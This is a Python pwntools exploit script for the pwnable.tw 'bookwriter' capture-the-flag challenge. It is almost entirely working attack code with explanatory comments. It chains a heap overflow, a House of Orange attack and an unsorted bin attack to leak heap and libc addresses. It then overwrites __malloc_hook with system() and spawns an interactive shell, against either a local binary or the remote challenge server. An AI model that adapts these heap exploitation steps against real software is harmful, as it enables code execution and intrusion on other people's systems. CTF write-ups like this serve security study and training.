from pwn import *

local = True

if local:
	r = process("./bookwriter")
	sys_off = 0x45390
	binsh_off = 0x18cd57
	malloc_hook_off = 0x3c4b10
else:
	r = remote("chall.pwnable.tw", 10304)
	sys_off = 0x45390	
	binsh_off = 0x18c177
	malloc_hook_off = 0x3c3b10

def add(size, content):
	r.sendline("1")
	r.recvuntil("Size of page :")
	r.sendline(str(size))
	r.recvuntil("Content :")
	r.send(content)
	r.recvuntil("Your choice :")

def view(index):
	r.sendline("2")
	r.recvuntil("Index of page :")
	r.sendline(str(index))
	return r.recvuntil("Your choice :")

def edit(index, content):
	r.sendline("3")
	r.recvuntil("Index of page :")
	r.sendline(str(index))
	r.recvuntil("Content:")
	r.send(content)
	r.recvuntil("Your choice :")

def info(question, author):
	r.send("4")
	result = r.recvuntil("(yes:1 / no:0)")
	if question[0] == '0':
		r.sendline("0")
		r.recvuntil("Your choice :")
	else:
		r.sendline(question)
		r.recvuntil("Author :")
		r.send(author)	
		r.recvuntil("Your choice :")
	return result	

def quit():
	r.sendline("5")

r.recvuntil("Author :")
author = "Nof"
r.send(author)
r.recvuntil("Your choice :")

# make 8 note
add(0x30, "lux")      # note_list[0]
add(0x10, "sona")     # note_list[1]
add(0x10, "sona")     # note_list[2]
add(0x10, "sona")     # note_list[3]
add(0x10, "sona")     # note_list[4]
add(0x10, "sona")     # note_list[5]
add(0x10, "sona")     # note_list[6]
add(0x10, "sona")     # note_list[7]

# make size of note_list[0] = 0
edit(0, "\n")

# make the note_list[8]
# now, size of the note_list[0] is 0xyyzztt, large enough to overwrite size of top chunk by editting note_list[0]
add(0x10, "javan")

# This is the time for House_of_orange attack
# first, make top chunk size smaller

# By editting note_list[0], we overwrite top chunk size
payload = p64(0)*7 + (p64(0x21) + p64(0)*3)*8 + p64(0xec1)
edit(0, payload)

# make size of note_list[0] = 0
# so now add a malloc in note_list[8]
edit(0, "\n")

# To make House_of_orange attack, the next step is call malloc(x) with  0xec1 < x < max_system_mem = 0x21000
add(0x1000, "/bin/sh\x00")

#Now top chunk has been freed and go into unsorted bin
# Size of note_list[0] have a big number again ( = heap + 0x21000 + 0x10)

# This is the time for unsorted_bin_attack
# we will make the note_list[0] change from heap'addr+0x10 to main_arena+88
# by overwrite top_chunk.bk
note_list = 0x6020a0
payload = p64(0)*7 + (p64(0x21) + p64(0)*3)*8 + p64(0x31) + p64(0) + p64(note_list-0x10)
edit(0, payload)

# make note_list[8] = 0 again for another malloc
edit(0, "\n")

# Now, when malloc happen, note_list[0] = main_arena+88
# in struct main_arena: bin[0] = top_chunk_addr
#                       bin[1] = note_list - 0x10
add(0x20, "\n")


# leak heap base addr
# now note_list[0] = main_arena+88 -> main_arena.top
# so we can leak heap top address
result = view(0)
result = result.split("Content :\n")[1][:4]
if result[3] == "\n":
	result = u64(result[:3] + "\x00"*5)
else:
	result = u64(result + "\x00"*4)	
# 0x22010 = 0x21000 + 0x1000 + 0x10
heap_base = result - 0x22010

# overwrite main_arena.(top, last_remainder, bins[0], bin[1]) to get bins[2] (main_arena+104)
payload = "a"*0x1c + "cccc"
edit(0, payload)

# leak main_arena+104
result = view(0)
result = result.split("cccc")[1][:6] + "\x00\x00"
result = u64(result)
libc_base = result - 104 - 0x10 - malloc_hook_off

# now we will make the next malloc point to (note_list-0x20) chunk (call killer chunk)
# to do that, we need to setup killer chunk in author global variable (such as: size=0x31, fd = bk = main+arena+88)
# But there's a problem:
# when we rename author, we use info() function, in this function we have __isoc99_scanf()
# this will malloc(0x1000) to hold the buffer
# so we need to make bins[0] and bins[1] = main_arena+88, so this malloc(0x1000) will take the top chunk
# after that, we edit bins[0] and bins[1] to note_list-0x20 and start next attack step

# restore main_arena
payload = p64(heap_base+0x22010) + p64(0) + p64(libc_base+malloc_hook_off+0x10 + 88)*2
edit(0, payload)

# set killer chunk in author
payload = "a"*32 + p64(0) + p64(0x31) + p64(libc_base+malloc_hook_off+0x10 + 88)*2
# set top_chunk inside the chunk of __isoc99_scanf ( 0x1010 )
# because in line* (below) the top_chunk will be 0x..00 instead of 0x..20
# 0x..20 = heap_base + 0x21000 + 0x1010 + 0x1010
# so we make use of __isoc99_scanf to up top_chunk 20bytes
scanf = p64(0x0a31) + "\x00"*0xfd8 + p64(0) + p64(0x20001)
info(scanf, payload)

# now size of note_list[0] is 3 (or 4) because main_arena.top = heap_base+0x22010
# in another word, if we want to overwrite bins[0] and bins[1] we need 0x20 bytes
# so we clear size of note_list[0]
########### line*
edit(0, "\n")

# now we can make a malloc to make the size of note_list[0] > 0x20
add(0x20, "nani")

# now we can edit bins[0] and bins[1] to point to note_list-0x20
# i make main-arena.top = 0 because i want to set note_list[8] = 0 -> so now we can use malloc
payload = p64(0) + p64(0) + p64(note_list-0x20)*2
edit(0, payload)

# malloc and overwrite note_list[1] and point to __malloc_hook
# note_list[0] point to the first chunk of heap like the beginning
payload = p64(0)*2 + p64(heap_base+0x10) + p64(libc_base+malloc_hook_off)
add(0x20, payload)

# overwrite malloc_hook by system()
sys_addr = libc_base + sys_off
binsh_addr = libc_base + binsh_off
edit(1, p64(sys_addr))

# make note_list[8] = 0 to the next malloc
edit(0, "\n")

# make a malloc to trigger system with the argument is addr of /bin/sh
r.sendline("1")
r.recvuntil("Size of page :")
# i choose /bin/sh in heap because the addr of it's only 3byte, while in libc file, addr is 6byte
# because malloc(size), the size variable only 4byte, so we can't use /bin/sh addr in libc file
r.sendline(str(heap_base + 0x21000 + 0x10))

r.interactive()

"""
- Solve this challenge have to try hard vcl
- Note:
+ __isoc99_scanf() malloc malloc(0x1000)
+ main_arena.top
+ main_arena.max_system_mem = 0x21000
"""
